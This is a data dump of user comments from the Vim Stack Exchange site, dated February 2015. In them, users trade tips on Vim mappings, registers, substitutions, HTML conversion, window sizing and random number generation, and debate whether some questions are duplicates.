  <row Id="939" PostId="751" Score="0" Text="Thanks; not sure how I missed this yesterday; I was confused by the `&lt;Plug&gt;NetrwBrowseX` (I thought that was the function being called), it's fairly obvious now :-) ... Using `&lt;cfile&gt;` is good to know, but not something I can use here since this is part of a larger script." CreationDate="2015-02-13T09:47:29.627" UserId="51" />
  <row Id="940" PostId="321" Score="0" Text="@ideasman42 What I meant was, that this is how Vim (specifically `!`) behaves. If you want different behaviour, you'll have to code it manually (I can't find anything built-in for it), and that this is probably because most UNIX programs work on lines." CreationDate="2015-02-13T09:58:01.110" UserId="51" />
  <row Id="943" PostId="697" Score="0" Text="I've discovered a flaw in your answer so I have to un-accept it, see my answer for more details. Thank you for the great help." CreationDate="2015-02-13T10:30:04.467" UserId="13" />
  <row Id="944" PostId="734" Score="0" Text="@ OP -- Thank you. I will try these solutions out today and the weekend and choose the best one then. Since I use vim at work it's hard to stop working and fumble with .vimrc" CreationDate="2015-02-13T11:40:59.430" UserId="486" />
  <row Id="945" PostId="733" Score="1" Text="Related: [Navigating multiple files](http://vi.stackexchange.com/a/553/467)." CreationDate="2015-02-13T12:31:30.737" UserId="467" />
  <row Id="946" PostId="553" Score="0" Text="Related: [How to open multiple files in split mode?](http://vi.stackexchange.com/q/732/467)" CreationDate="2015-02-13T12:31:59.433" UserId="467" />
  <row Id="947" PostId="760" Score="2" Text="I would note that yanking a linewise motion into your register will have a side effect of including a newline character, as if you had pressed `Enter` at the end of your recording. In many cases this might be benign, but in scenarios where you've carefully crafted the cursor position at the end of the recording, it can affect the repeatability." CreationDate="2015-02-13T13:53:45.760" UserId="64" />
  <row Id="948" PostId="697" Score="2" Text="@toro2k Thanks. I didn't know about that. I edited my answer, I also added `silent` so you won't get a message if you're not using this `autogroup`. I also fixed another problem I noticed: `:w another_name` didn't work (not it works)." CreationDate="2015-02-13T14:16:03.000" UserId="51" />
  <row Id="949" PostId="760" Score="0" Text="@tommcdo Right; you can just use `v` and select the entire line (without the newline)." CreationDate="2015-02-13T14:16:51.093" UserId="51" />
  <row Id="950" PostId="697" Score="0" Text="Definetly better! Thank you! Just a question, why you have used `write filename` instead of just `write`?" CreationDate="2015-02-13T14:27:55.700" UserId="13" />
  <row Id="951" PostId="697" Score="2" Text="@toro2k Because otherwise `write` will just write to current filename (just like when you type `:write`), and `:write another_filename` won't work (it will still use the original filename)." CreationDate="2015-02-13T14:43:55.540" UserId="51" />
  <row Id="952" PostId="697" Score="0" Text="O yes, now I understand! :-)" CreationDate="2015-02-13T14:44:45.357" UserId="13" />
  <row Id="953" PostId="765" Score="0" Text="&quot;If you don't want to clutter your screen with highlighted spaces everywhere&quot; this assumes too much about the OP's setup." CreationDate="2015-02-13T15:26:39.147" UserId="54" />
  <row Id="954" PostId="765" Score="0" Text="@romainl Better?" CreationDate="2015-02-13T15:28:11.020" UserId="13" />
  <row Id="955" PostId="765" Score="1" Text="Yes, it's better IMO." CreationDate="2015-02-13T15:42:07.570" UserId="54" />
  <row Id="956" PostId="742" Score="0" Text="Thank you so much for the trouble, @JohnO'M. If you arrive to a conclusion make sure to post it as an answer. I searched the web (quite) a bit for this kind of feature and found nothing." CreationDate="2015-02-13T15:53:14.863" UserId="356" />
  <row Id="957" PostId="765" Score="0" Text="Is `\r` the newline or `\n`?" CreationDate="2015-02-13T16:06:01.090" UserId="205" />
  <row Id="958" PostId="765" Score="2" Text="It is `\r`, see `:help s/\r`. It could be replaced by a literal newline typing `&lt;c-v&gt;&lt;cr&gt;`. In this context `\n` is a null character, see `:help s/\n`." CreationDate="2015-02-13T16:09:01.223" UserId="13" />
  <row Id="962" PostId="766" Score="0" Text="Could you clarify your preface? Do you wish to avoid all plugins, or just ones similar to the two you mention? If the latter, what about those two do you not like?" CreationDate="2015-02-13T19:11:39.123" UserId="163" />
  <row Id="963" PostId="766" Score="0" Text="I do not want to use any plugins for this. I've updated the preface." CreationDate="2015-02-13T19:14:39.807" UserId="489" />
  <row Id="964" PostId="2" Score="3" Text="Here's a small abbreviation:&#xA;:set nu &quot; to enable&#xA;:set nonu &quot; to disable" CreationDate="2015-02-13T19:30:18.763" UserId="496" />
  <row Id="966" PostId="774" Score="0" Text="@Carpetsmoker dang you beat me to it by seconds! :D OP: also try: http://vi.stackexchange.com/questions/710/can-i-paste-a-yanked-line-even-if-i-delete-a-line/711#711" CreationDate="2015-02-13T19:53:03.840" UserId="205" />
  <row Id="967" PostId="771" Score="0" Text="Could you provide an example on how to reproduce this? Because I don't quite follow what the problem is. I've never noticed this prompt, and I can't get it to appear even with very long paths..." CreationDate="2015-02-13T19:57:01.870" UserId="51" />
  <row Id="968" PostId="762" Score="0" Text="Related to the extra window, see: http://vi.stackexchange.com/a/544/205" CreationDate="2015-02-13T19:58:53.777" UserId="205" />
  <row Id="970" PostId="769" Score="2" Text="possible duplicate of [How can I copy text to the system clipboard from Vim?](http://vi.stackexchange.com/questions/84/how-can-i-copy-text-to-the-system-clipboard-from-vim) .... This is covered in (my) accepted answer I think (unless I misunderstood the question): *&quot;if you use gVim, you can get copy-on-select behaviour when using `:set guioptions+=a`. This is enabled by default on X11 systems (copies to PRIMARY)*&quot;" CreationDate="2015-02-13T20:02:06.897" UserId="51" />
  <row Id="972" PostId="766" Score="0" Text="I understand that a plugin is just vimscript, but I don't want all the extra stuff those plugins add. I just want that very simple use case that I outlined. I may dive into the source of some of them and see if I can pull out some code that does what I want." CreationDate="2015-02-13T20:06:24.993" UserId="489" />
  <row Id="973" PostId="767" Score="0" Text="This actually seems to work? If I use `:set mouse=a number`, select some text with the mouse, and paste it, I *don't* get the numbers? I tested both in Vim and gVim on Linux." CreationDate="2015-02-13T20:10:08.010" UserId="51" />
  <row Id="974" PostId="771" Score="0" Text="Done; the &quot;press enter&quot; (:help press-enter) prompt shows up when vim is about to redraw the screen after printing stuff for you to read that didn't all fit on the screen; it &quot;helpfully&quot; doesn't want you to miss that information. But in this case, the information is simply telling me &quot;you opened these two files&quot; which I know... because I opened them." CreationDate="2015-02-13T20:11:27.077" UserId="72" />
  <row Id="975" PostId="776" Score="0" Text="Yes! The `O` option, in particular, was never one I tried along with t/T apparently." CreationDate="2015-02-13T20:41:38.557" UserId="72" />
  <row Id="976" PostId="769" Score="2" Text="@Carpetsmoker Only part of this is covered in that (useful) post and I believe this somewhat different use case deserves specific treatment. Making this a duplicate will not make it easier to sort out for people with this specific goal in mind." CreationDate="2015-02-13T20:54:10.680" UserId="267" />
  <row Id="977" PostId="767" Score="0" Text="@Carpetsmoker Ty, this is the solution." CreationDate="2015-02-13T21:10:23.483" UserId="153" />
  <row Id="978" PostId="766" Score="0" Text="You definitely have to dive into Vimscript to get this done.  Regular expressions are not powerful enough, by themselves, to handle balanced characters." CreationDate="2015-02-13T21:27:36.533" UserId="93" />
  <row Id="980" PostId="780" Score="5" Text="possible duplicate of [Using % in languages without curly braces](http://vi.stackexchange.com/questions/126/using-in-languages-without-curly-braces) ... This solution also works for HTML (just tested it, if you're on a `&gt;` it will work like before, if you're on the `div` it will work like you want)." CreationDate="2015-02-13T22:11:26.747" UserId="51" />
  <row Id="981" PostId="750" Score="0" Text="This works for `iq`, but doesn't seem to work with, for example, `daq`." CreationDate="2015-02-13T22:13:17.863" UserId="88" />
  <row Id="982" PostId="766" Score="0" Text="@QuincyBowers You're definitely right.. What do you think some pseudo-code for this would look like?" CreationDate="2015-02-13T23:05:21.593" UserId="489" />
  <row Id="983" PostId="766" Score="1" Text="I've voted to close this question.  I think the basic *topic* as such is fine, but your restrictions make it a &quot;please write some code for me plz kthxbye&quot;-question right now. I don't think we want to allow these sort of questions here..." CreationDate="2015-02-13T23:07:50.847" UserId="51" />
  <row Id="984" PostId="766" Score="1" Text="@Carpetsmoker Beyond the wording of this question is a problem that has yet to be solved in any plugin that I have seen. It seems clear to me that once this question is answered successfully, every auto-closing or auto-pair type plugin will be able to benefit from its solution. How would you suggest I change the wording to make it acceptable?" CreationDate="2015-02-13T23:13:25.657" UserId="489" />
  <row Id="985" PostId="775" Score="1" Text="There are already Normal mode mappings for maximizing the window in one dimension: `&lt;C-W&gt;|` for horizontal and `&lt;C-W&gt;_` for vertical." CreationDate="2015-02-13T23:24:19.237" UserId="64" />
  <row Id="986" PostId="766" Score="0" Text="Your diagram is confusing. Is the cursor on the column before the bar or after it (for &quot;(|)&quot; is the cursor on the open or close paren)? Do you want this to work in normal mode or insert mode?" CreationDate="2015-02-13T23:37:49.227" UserId="72" />
  <row Id="987" PostId="766" Score="0" Text="I have updated the question" CreationDate="2015-02-13T23:42:41.250" UserId="489" />
  <row Id="988" PostId="780" Score="0" Text="@Carpetsmoker If this question would be duplicated of general-like answer (using one plugin), then it won't allow for any answers which are dealing with html tags specifically." CreationDate="2015-02-14T00:02:47.113" UserId="467" />
  <row Id="989" PostId="780" Score="0" Text="However, the other question has exactly the same answer, so this is a duplicate." CreationDate="2015-02-14T00:04:56.673" UserId="88" />
  <row Id="990" PostId="780" Score="0" Text="Posted sample answer which won't fit into other question, so it's not duplicate then." CreationDate="2015-02-14T00:20:17.497" UserId="467" />
  <row Id="992" PostId="780" Score="1" Text="@Doorknob The fact that two questions happen to have the same answer does not necessarily mean that the questions are duplicates of each other." CreationDate="2015-02-14T05:49:36.043" UserId="24" />
  <row Id="994" PostId="780" Score="0" Text="Same question, same answer." CreationDate="2015-02-14T07:33:12.783" UserId="54" />
  <row Id="995" PostId="766" Score="0" Text="For what it's worth I vote *against* closing this question." CreationDate="2015-02-14T09:15:11.730" UserId="130" />
  <row Id="996" PostId="778" Score="0" Text="Is a VCS of any kind in use for your respective folders? That would open up a whole range of answers and plugins that may not be available for flat folders." CreationDate="2015-02-14T09:25:39.750" UserId="267" />
  <row Id="997" PostId="789" Score="4" Text="This is a [UUOC](http://en.wikipedia.org/wiki/Cat_%28Unix%29#Useless_use_of_cat); simply use `vim '+:0,$s/foo/test/g' '+:wq! file2' file1` instead." CreationDate="2015-02-14T12:49:40.347" UserId="88" />
  <row Id="1000" PostId="792" Score="3" Text="What do you mean by converting? What is expected output?" CreationDate="2015-02-14T14:41:33.293" UserId="153" />
  <row Id="1001" PostId="792" Score="0" Text="Expected output would be html (browser friendly format)." CreationDate="2015-02-14T14:42:14.633" UserId="467" />
  <row Id="1003" PostId="792" Score="1" Text="All text files are 'browser friendly'. But when I see [Alexander Myshov's answer](http://vi.stackexchange.com/a/793/153) I think I understand what you mean." CreationDate="2015-02-14T14:45:46.203" UserId="153" />
  <row Id="1004" PostId="766" Score="2" Text="@merb, the paredit plugin does exactly what you want.  If you want that functionality without actually using the plugin then I suggest you examine the source on github.  I think that would be more instructive than me trying to reproduce a version of it here.  https://github.com/kovisoft/paredit" CreationDate="2015-02-14T16:56:00.850" UserId="93" />
  <row Id="1005" PostId="798" Score="4" Text="Just curious, what are you trying to accomplish? As in, what will vim do for you here that some other tool might not?" CreationDate="2015-02-14T17:32:33.877" UserId="411" />
  <row Id="1006" PostId="775" Score="1" Text="This is a nice trick, so that why I +1 it. but it doesn't give a solution to my problem. open the window in specific size as default." CreationDate="2015-02-14T17:32:49.717" UserId="496" />
  <row Id="1007" PostId="798" Score="0" Text="@JayThompson I'm trying to use `vim` for file parsing instead of `sed` (e.g. mass repeated complex changes to multiple large files). The example doesn't do anything to keep it simple and not making potential duplicate of another [post](http://vi.stackexchange.com/q/788/467)." CreationDate="2015-02-14T17:37:37.753" UserId="467" />
  <row Id="1008" PostId="798" Score="0" Text="You know about vipe, so any reason you're not using it?" CreationDate="2015-02-14T17:51:33.837" UserId="205" />
  <row Id="1009" PostId="798" Score="0" Text="@muru I didn't use it yet, not much documentation available and it's [off-topic](http://meta.vi.stackexchange.com/q/188/467) here." CreationDate="2015-02-14T17:53:04.467" UserId="467" />
  <row Id="1010" PostId="798" Score="0" Text="Questions about vipe might be, but there's no reason it can't be the answer. So I am wondering why I shouldn't post it as an answer." CreationDate="2015-02-14T17:56:06.890" UserId="205" />
  <row Id="1011" PostId="798" Score="0" Text="@muru Try answering with `vipe`, sounds interesting. I've found the solution for `vim` already, easier than I thought, I'll post it as well." CreationDate="2015-02-14T17:57:39.037" UserId="467" />
  <row Id="1013" PostId="745" Score="0" Text="The help text for path says it's recommended that you append instead of assign, so if the plugin is overwriting the path, perhaps it should be treated as a bug and a issue raised on Github." CreationDate="2015-02-14T19:07:35.347" UserId="205" />
  <row Id="1014" PostId="745" Score="0" Text="I raised the bug, but it was closed almost immediately and I was fairly satisfied with the reasoning. If you or anyone else feels it should be reopened and is affected by it feel free to comment, the issue shouldn't be too hard to find on GitHub" CreationDate="2015-02-14T19:11:57.437" UserId="489" />
  <row Id="1015" PostId="13" Score="0" Text="There are some activities for which a keyboard will always be a more suitable interface than a touch screen. Writing code is probably one of them. Other tasks that you use vi for might be more naturally done with another application when you're on a tablet." CreationDate="2015-02-14T19:13:51.077" UserId="460" />
  <row Id="1016" PostId="804" Score="0" Text="This does work. And with no side effects. I should learn to use maps. Thank you." CreationDate="2015-02-14T19:36:51.363" UserId="356" />
  <row Id="1017" PostId="766" Score="0" Text="@QuincyBowers Thank you for pointing that out. Hopefully I'll be able to post an answer to this soon.." CreationDate="2015-02-14T19:48:33.633" UserId="489" />
  <row Id="1021" PostId="688" Score="0" Text="Perhaps.. Or is this more general?" CreationDate="2015-02-14T22:25:53.020" UserId="205" />
  <row Id="1022" PostId="809" Score="0" Text="I was hoping to be able to append `**` to the path, and then remove specific files and directories that would be matched by `**`. I cannot remove a specific file using `set path-=whatever` when I use the wildcard `**` ." CreationDate="2015-02-14T22:26:51.370" UserId="489" />
  <row Id="1023" PostId="807" Score="1" Text="Pure vim? Or, say, using `:python`?" CreationDate="2015-02-14T22:28:08.100" UserId="205" />
  <row Id="1024" PostId="809" Score="0" Text="Use `:help wildignore` to ignore specific directories and files." CreationDate="2015-02-14T22:28:56.147" UserId="54" />
  <row Id="1025" PostId="807" Score="0" Text="Pure vim preferred, but if it's not build-in, any easy memorable method is fine." CreationDate="2015-02-14T22:36:58.840" UserId="467" />
  <row Id="1026" PostId="688" Score="0" Text="It's similar, but I wouldn't know what are permanent line numbers. Secondly the other question is about all lines (and the answer does that) for gVim on Windows specifically and this is simple numbered list for one paragraph only in plain vim." CreationDate="2015-02-14T22:42:03.403" UserId="467" />
  <row Id="1028" PostId="688" Score="3" Text="Well, I guess that post uses &quot;permanent&quot; ot indicate that the buffer is to be modified, and that the numbers aren't some purely visual thing (same as you). The reason for specifying gvim on Windows is to avoid external utilities like `cat` or `nl`, which can do number lines, but aren't generally available on Windows (as OP indicates from their comment about `awk`). The top two solutions are pure Vim. Lastly, all lines vs one para is just a matter of range selection. Clearly not a big issue." CreationDate="2015-02-14T22:45:43.103" UserId="205" />
  <row Id="1029" PostId="808" Score="0" Text="So I've added in this case [tag:unix] as I'm on OSX, as I'm not limiting to pure vim, especially on Windows. So in this case it's not duplicate. Then Unix commands are welcomed." CreationDate="2015-02-14T22:49:44.387" UserId="467" />
  <row Id="1031" PostId="688" Score="0" Text="Still not convinced, as you can get Cygwin, MSYS and SUA on Windows, and the last answer (`cat -n`) covers that case, but not for paragraphs, I suppose." CreationDate="2015-02-14T22:51:11.783" UserId="205" />
  <row Id="1033" PostId="809" Score="0" Text="I dont believe that `wildignore` supports relative paths.." CreationDate="2015-02-14T23:20:18.000" UserId="489" />
  <row Id="1034" PostId="812" Score="0" Text="Instead of `tr -d '[:space:]'`, perhaps `tr -cd '[:digit:]'` for the grep filter?" CreationDate="2015-02-14T23:33:52.793" UserId="205" />
  <row Id="1035" PostId="812" Score="0" Text="@muru I'm not sure that will work on OSX, which is why I didn't use it... You also get the numbers seperated by a newline this way, like the OP asked...." CreationDate="2015-02-14T23:35:21.147" UserId="51" />
  <row Id="1036" PostId="812" Score="0" Text="If that's the case.... GNU beats BSD. :P" CreationDate="2015-02-14T23:36:16.477" UserId="205" />
  <row Id="1039" PostId="808" Score="0" Text="The other answer covers many different sort of answers; including Vim-only and UNIX-only. Actually, the UNIX-only will also work on windows if you have msysgit or cygwin installed. Unless there's a compelling reason why none of the answers work for you, I see no reason to add another question (and thus, this is a duplicate)." CreationDate="2015-02-14T23:47:29.893" UserId="51" />
  <row Id="1040" PostId="810" Score="0" Text="@Carpetsmoker [`random.sample`](https://docs.python.org/2/library/random.html#random.sample) repuires only two arguments on Python 2, [`str`](https://docs.python.org/2/library/functions.html?highlight=str#str) is the builtin function to convert things to strings. Let me look up the Py3 equivalents (`str` would be the same, will have to check `xrange` and `random.sample`)." CreationDate="2015-02-14T23:47:31.397" UserId="205" />
  <row Id="1042" PostId="810" Score="0" Text="@Carpetsmoker aargh, typo. The bracket after 60 is supposed to be after 10000. And `xrange` is not in Python3 because `range` is equivalent (neither actually constructs a list, unlike `range` in Py2)." CreationDate="2015-02-14T23:55:08.960" UserId="205" />
  <row Id="1043" PostId="810" Score="0" Text="@Carpetsmoker And the final difference is that `map` in Py3 returns an iterable and not a list, so the last line would use `list(map(str, random.sample(range(10000), 60)))`" CreationDate="2015-02-14T23:58:13.500" UserId="205" />
  <row Id="1045" PostId="805" Score="1" Text="It's not clear to me what you are trying to accomplish? Your example doesn't make any sense, what behaviour exactle do you want?" CreationDate="2015-02-15T00:08:46.840" UserId="51" />
  <row Id="1046" PostId="803" Score="0" Text="Can't use type 2 backticks to get a backtick? Or configure your OS to do that? That's still an extra keystoke, but better than ` + space ..." CreationDate="2015-02-15T00:10:50.413" UserId="51" />
  <row Id="1047" PostId="794" Score="1" Text="You don't need the `%`, since that's the default. Also note that this is exactly the same as the other answer (`:runtime! syntax/2html.vim`), the only difference is that with `TOhtml` you can add easily a range (instead of setting `g:html_start_line` and `g:html_end_line` manually." CreationDate="2015-02-15T00:14:52.520" UserId="51" />
  <row Id="1050" PostId="803" Score="0" Text="@Carpetsmoker No. Typing two backticks normally results in \`\` for me. But in Normal mode it seems like another thing happens: I type  \`\`a and Vim says &quot;E78: Unknown mark.&quot; From `showcmd` I think Vim understands this as \`à. Also I would like to make the behaviour OS independent. `map` seems to do the work." CreationDate="2015-02-15T00:34:44.840" UserId="356" />
  <row Id="1051" PostId="810" Score="0" Text="Okay, I've taken the liberty to edit your post with some (minor) changes to make it compatible with both Python 2 and 3..." CreationDate="2015-02-15T00:51:52.653" UserId="51" />
  <row Id="1053" PostId="688" Score="0" Text="Then there is no point of having OS-dependent tags, if you can always install cygwin/msysgit." CreationDate="2015-02-15T01:42:10.470" UserId="467" />
  <row Id="1054" PostId="688" Score="0" Text="And if we want to keep OS-dependent tags, then Windows question shouldn't have Unix-like answers and these should be moved here, so both questions could have different answers." CreationDate="2015-02-15T01:47:24.897" UserId="467" />
  <row Id="1055" PostId="804" Score="0" Text="You're welcome. Glad I could help." CreationDate="2015-02-15T03:05:41.670" UserId="227" />
  <row Id="1058" PostId="797" Score="1" Text="Just wanted to add that `bc` can be good for quick math, i.e., `:r! bc -l &lt;&lt; '2^30'`." CreationDate="2015-02-15T06:40:33.700" UserId="44" />
  <row Id="1059" PostId="812" Score="0" Text="One can also use the shell (system) for inputting random numbers, i.e. `:r! hexdump -n $((3*4)) -e  '&quot;%d&quot;' /dev/urandom`, would generate 3 random signed integers." CreationDate="2015-02-15T07:13:20.950" UserId="44" />
  <row Id="1060" PostId="813" Score="0" Text="After typing `1. &lt;esc&gt;h` you are on the second column, not first column. I would replace the `h` with `0`, after which I think your solution should be very good." CreationDate="2015-02-15T09:26:36.077" UserId="21" />
  <row Id="1061" PostId="811" Score="2" Text="This does not give the same formatting as given in the question. However, I like the simplicity of the solution." CreationDate="2015-02-15T09:27:20.323" UserId="21" />
  <row Id="1062" PostId="809" Score="0" Text="Observation is better than belief." CreationDate="2015-02-15T10:04:38.430" UserId="54" />
  <row Id="1063" PostId="810" Score="0" Text="@Carpetsmoker cool! Thanks!" CreationDate="2015-02-15T13:35:06.763" UserId="205" />
  <row Id="1064" PostId="813" Score="0" Text="@KarlYngveLervåg Whoops, that was a typo. Thanks, fixed it." CreationDate="2015-02-15T14:18:32.217" UserId="88" />
  <row Id="1065" PostId="822" Score="0" Text="NERDTree defines a configuration variable too, it's `NERDTreeWinSize`." CreationDate="2015-02-15T19:00:55.193" UserId="13" />
  <row Id="1066" PostId="811" Score="0" Text="@KarlYngveLervåg Thanks, included that in the answer." CreationDate="2015-02-15T22:12:48.243" UserId="467" />
  <row Id="1069" PostId="819" Score="0" Text="It also works with `zsh`, but not with `sh`, `dash`, `fish`, `csh`, or `tcsh` ... You could use `:r! bash -c 'echo $RANDOM'` ..." CreationDate="2015-02-15T23:24:37.590" UserId="51" />
  <row Id="1070" PostId="822" Score="0" Text="@toro2k Right you are sir! I looked through the options list and I couldn't find it. I'm updating my answer." CreationDate="2015-02-16T00:53:05.270" UserId="227" />
  <row Id="1071" PostId="822" Score="0" Text="^ That should have read &quot;I looked through the options list and couldn't find anything related to size when I originally wrote the answer&quot;" CreationDate="2015-02-16T01:06:41.707" UserId="227" />
  <row Id="1073" PostId="836" Score="1" Text="possible duplicate of [How can I find out what &lt;Leader&gt; is set to?](http://vi.stackexchange.com/questions/281/how-can-i-find-out-what-leader-is-set-to)" CreationDate="2015-02-16T04:17:54.703" UserId="246" />
  <row Id="1074" PostId="836" Score="6" Text="Akshay: Not a duplicate, that wants to check the value of `&lt;leader&gt;`, this one wants to know what `&lt;leader&gt;` means. So that that value can be interpreted. It is the difference between asking &quot;In newton motion what is v?&quot; and &quot;Given an apple falled from a 10m high tree, what is v when it hits the ground?'" CreationDate="2015-02-16T04:26:37.620" UserId="360" />
  <row Id="1075" PostId="838" Score="6" Text="Your title mentions tabs, but the body of your question doesn't. Do you mean multiple spaces between words? Or do you mean something that interacts with tabs? I guess I would benefit from a concrete example" CreationDate="2015-02-16T06:44:56.570" UserId="130" />
  <row Id="1076" PostId="836" Score="0" Text="fair, thanks for the cool analogy :)" CreationDate="2015-02-16T08:34:53.000" UserId="246" />
  <row Id="1077" PostId="834" Score="6" Text="@Carpetsmoker I think this question is broader. The author is not just asking how to set parameters in a buffer of a particular filetype, but to a certain extent *what* parameters to set to ensure privacy. That's certainly not obvious or collected together in a central place, so I think it makes a good question." CreationDate="2015-02-16T08:42:22.457" UserId="91" />
  <row Id="1078" PostId="819" Score="0" Text="*&quot;return last few digits from the current timestamp&quot;* -&gt; This is not random. Using the time to get a pseudo-random number is almost always a bad idea, *even* for non-crypto purposes. What if the timestamp's resolution is in seconds and you create a &quot;file.$random&quot; twice in a second? Oops! ... Plus, you never know when someone's going to use your `GetRandom()` function where good prng *does* matter, so it's better to just get it right from the start if possible (and it's almost always possible here!)" CreationDate="2015-02-16T10:06:22.137" UserId="51" />
  <row Id="1080" PostId="813" Score="0" Text="No problem. However, you still have not updated the explanation. Also: On many keyboards, `^` waits for a second character in order to allow typing combinations like `^a -&gt; â`. I still agree its the best solution, but I think this should be mentioned as well." CreationDate="2015-02-16T10:48:27.927" UserId="21" />
  <row Id="1081" PostId="819" Score="0" Text="I don't know what the quality of `$RANDOM` is, but if this is a poor PRNG then that's not a reason to use an even poorer PRNG :-) Instead, upgrade to a better PRNG! As far as I know, `/dev/urandom` is available on all platforms where `bash` is commonly available, so I don't see a reason to *not* use it." CreationDate="2015-02-16T10:59:09.990" UserId="51" />
  <row Id="1090" PostId="792" Score="0" Text="I think a detail is missing from the question. Do you want to produce a full HTML document for each source file or just a fragment of HTML code you can embed in another document, or it doesn't matter?" CreationDate="2015-02-16T12:22:27.823" UserId="13" />
  <row Id="1095" PostId="758" Score="2" Text="Now that you have answerd the question yourself I'm pretty confused about what you're asking. From the question I understand you are asking how to rearrange opened windows in a different layout but from your answer I understand you want to close all the opened windows but one, and to open all listed buffers in splitted windows." CreationDate="2015-02-16T12:54:00.500" UserId="13" />
  <row Id="1096" PostId="837" Score="7" Text="I believe that the rationale behind the `&lt;Leader&gt;` is that it provides you with a &quot;clean&quot; way to provide custom shortcuts, without overriding existing Vim shortcuts." CreationDate="2015-02-16T13:00:15.937" UserId="51" />
  <row Id="1097" PostId="838" Score="1" Text="Agreed, can you provide a concrete example please? Bit confused why you'd want this, which makes me think we/I don't understand the question." CreationDate="2015-02-16T13:02:10.427" UserId="91" />
  <row Id="1098" PostId="758" Score="0" Text="@toro2k I've opened multiple files using `-p`, `-o`, `-O` which appear in different split layouts, but I'd like to know how to switch between different layouts while I'm editing them (in the editor, without quitting and re-opening files again)." CreationDate="2015-02-16T13:03:10.393" UserId="467" />
  <row Id="1101" PostId="847" Score="0" Text="Yes, your test seems to work for me also. But it doesn't work with my nnoremap mapping - I am wondering if that's because I am using &lt;expr&gt; in my mapping. Investigating..." CreationDate="2015-02-16T13:36:01.967" UserId="91" />
  <row Id="1102" PostId="847" Score="0" Text="I tried simplifying my mapping to `nnoremap &lt;Leader&gt;x ':new ~/Desktop/x.txt'` to remove the &lt;expr&gt;. But `vim -c 'execute &quot;normal \\x&quot;'` gives &quot;Error detected while processing command line: E78: Unknown mark&quot;. Any thoughts why?" CreationDate="2015-02-16T13:38:52.100" UserId="91" />
  <row Id="1103" PostId="847" Score="0" Text="@AndrewFerrier Yeah, I can't get it to work with your mapping either :-/ ... Perhaps a better solution for this problem is to use the `VimEnter` autocmd or some such? ... I don't have time to investigate right now, if no one else comes up with an answer this evening, I'll look into it (I'll leave this answer to be for the time), because this seems like a sort if thing  I would want to have/use as well :-)" CreationDate="2015-02-16T13:39:32.373" UserId="51" />
  <row Id="1104" PostId="847" Score="0" Text="no worries, no rush. It's just a curiosity for me right now. Thanks for your pointers so far." CreationDate="2015-02-16T13:40:11.253" UserId="91" />
  <row Id="1105" PostId="848" Score="9" Text="Why use Vim, and not text based web browser? Such as `lynx`, `links`, `elinks`, or `w3m`? Vim is a text editor, not a web browser ... you can do this from within Vim even, with `:!lynx %`" CreationDate="2015-02-16T14:07:35.720" UserId="51" />
  <row Id="1106" PostId="848" Score="3" Text="There are some external tools for converting HTML to Markdown. [This vimcasts episode](http://vimcasts.org/episodes/using-external-filter-commands-to-reformat-html/) shows how to use pandoc, which may suit your needs." CreationDate="2015-02-16T14:08:54.340" UserId="64" />
  <row Id="1107" PostId="812" Score="0" Text="@HAL9001 Your example doesn't work (at least on OSX, doesn't paste anything). However on shell returns sometimes like: `444204315-1248057303-74280604`." CreationDate="2015-02-16T14:09:51.163" UserId="467" />
  <row Id="1108" PostId="812" Score="0" Text="@Carpetsmoker Example `:echo system(...` is just printing on the screen, can you modify the example to paste into the editor?" CreationDate="2015-02-16T14:12:19.777" UserId="467" />
  <row Id="1111" PostId="851" Score="1" Text="It's available since vim 7.4." CreationDate="2015-02-16T15:31:34.617" UserId="467" />
  <row Id="1112" PostId="852" Score="1" Text="These are all useful tips, but I don't see how they answer the question?" CreationDate="2015-02-16T15:35:27.753" UserId="51" />
  <row Id="1113" PostId="308" Score="1" Text="You should take a look at the so called [approximate string matching algorithms](https://en.wikipedia.org/wiki/Approximate_string_matching), they are more appropriate tools to implement a fuzzy finder than regexps." CreationDate="2015-02-16T16:38:03.727" UserId="13" />
  <row Id="1114" PostId="852" Score="0" Text="@Carpetsmoker I could say the same about your own answer.  I told him it wasn't possible and offered a change of workflow as a possible work around.  Just like you did." CreationDate="2015-02-16T17:16:42.160" UserId="93" />
  <row Id="1115" PostId="812" Score="1" Text="@kenorb This will correctly use the shell for inputting 3 signed random integers: `:r! hexdump -n $((3*4)) -e '&quot;\%d\n&quot;' /dev/urandom`" CreationDate="2015-02-16T17:49:27.200" UserId="44" />
  <row Id="1116" PostId="862" Score="1" Text="[SU question](http://superuser.com/a/457974/334516), also with workarounds like this one." CreationDate="2015-02-16T20:09:37.153" UserId="205" />
  <row Id="1118" PostId="863" Score="0" Text="heh, you beat me to it while I was getting a beer :-)" CreationDate="2015-02-16T20:18:21.503" UserId="51" />
  <row Id="1119" PostId="865" Score="1" Text="This is a rather twisted way to go about, though." CreationDate="2015-02-16T20:41:17.607" UserId="205" />
  <row Id="1120" PostId="812" Score="0" Text="@HAL9001 I think using `%u` as a format would be better, since that's unsigned? This should remove negative numbers &amp; the associated `-` character ... Also, why not just type `12` insyead of `$((3*4))`? That way it will work in *all* shells..." CreationDate="2015-02-16T20:58:21.480" UserId="51" />
  <row Id="1121" PostId="838" Score="0" Text="Not sure what is confusing about this question. Seems pretty obvious what the OP wants." CreationDate="2015-02-16T22:11:07.127" UserId="383" />
  <row Id="1125" PostId="750" Score="0" Text="Right. You can make it work with `aq` as well with an additional similar mapping. I edited the answer. I also swapped T` with t' in the mapping so that it searches forward first, which seems more natural to me." CreationDate="2015-02-16T23:21:45.310" UserId="195" />
  <row Id="1126" PostId="750" Score="0" Text="This works for single quotes, but `daq` on `\`\`foo''` just results in `\`foo'`." CreationDate="2015-02-16T23:57:11.343" UserId="88" />
  <row Id="1127" PostId="51" Score="1" Text="How usable is it right now? Anyone tried it with FinalTerm?" CreationDate="2015-02-17T00:28:52.280" UserId="205" />
  <row Id="1128" PostId="812" Score="0" Text="@Carpetsmoker The multiplication is to emphasize that the numbers come in 4 byte packages, and yes, depending on the context `%u` may be better suited." CreationDate="2015-02-17T00:49:38.690" UserId="44" />
  <row Id="1129" PostId="750" Score="0" Text="I don't think this method can work for more than single quotes. You would need to do deeper inspection of the text than the `f` and `t` operators allow, which would require writing a whole function with variables and everything. I don't have time to do so right now." CreationDate="2015-02-17T01:49:55.397" UserId="195" />
  <row Id="1130" PostId="51" Score="1" Text="@muru it's very much usable, not too sure about using with FinalTerm though, give it a shot." CreationDate="2015-02-17T02:57:09.867" UserId="74" />
  <row Id="1131" PostId="838" Score="1" Text="What about spaces in the middle of the line? For example how do you want to deal with a line like `^Iint a; ^I ; int b;` (`^I`s are tabs)? The spaces around the second tab should be removed?" CreationDate="2015-02-17T08:55:26.577" UserId="13" />
